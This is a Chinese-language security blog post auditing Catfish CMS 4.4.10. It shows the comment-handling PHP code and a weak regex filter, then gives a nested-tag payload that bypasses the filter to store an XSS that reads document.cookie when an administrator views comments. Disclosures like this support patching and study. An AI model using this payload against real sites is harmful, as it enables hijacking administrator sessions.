---
title: Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞
date: 2017-07-11 19:34:56
tags: [代码审计,XSS,漏洞分析]
categories: Web安全
---
Catfish(鲶鱼) CMS V 4.4.10 ：http://www.catfish-cms.com/

# 审计

在`...\application\index\controller\Index.php`中，定义了评论功能。代码如下；
```php
//添加评论
$data = [
	'post_id' => Request::instance()->post('id'),
	'url' => 'index/Index/article/id/'.Request::instance()->post('id'),
	'uid' => Session::get($this->session_prefix.'user_id'),
	'to_uid' => $beipinglunren['post_author'],
	'createtime' => date("Y-m-d H:i:s"),
	'content' => $this->filterJs(Request::instance()->post('pinglun')),
	'status' => $plzt
];
Db::name('comments')->insert($data);
```
评论内容content在经过函数filterJs过滤后插入到数据库中。

filterJs定义在`...\application\index\controller\Common.php`中
```php
protected function filterJs($str)
{
        return preg_replace(['/<script[\s\S]*?<\/script>/i','/<style[\s\S]*?<\/style>/i'],'',$str);
}
```
仅做了简单的过滤，只要构造下列payload就可绕过:
```
<scr<script></script>ipt>alert(document.cookie)</scr<script></script>ipt>
```
filterJs会把`<script>**</script>替换为空`，从而使插入到数据库中的数据变为：
```
<script>alert(document.cookie)</script>替换为空
```

# 验证

以普通账户user登陆，并对文章进行评论

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/2.jpg?raw=true)

因为Catfish CMS在前端进行了一次编码过滤，若是直接在评论区直接插入payload会被编码转换。所i抓包，将pinglun参数改为payload

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/3.jpg?raw=true)

admin登陆后台，触发XSS：

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/4.jpg?raw=true)

查看源代码：

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/5.jpg?raw=true)
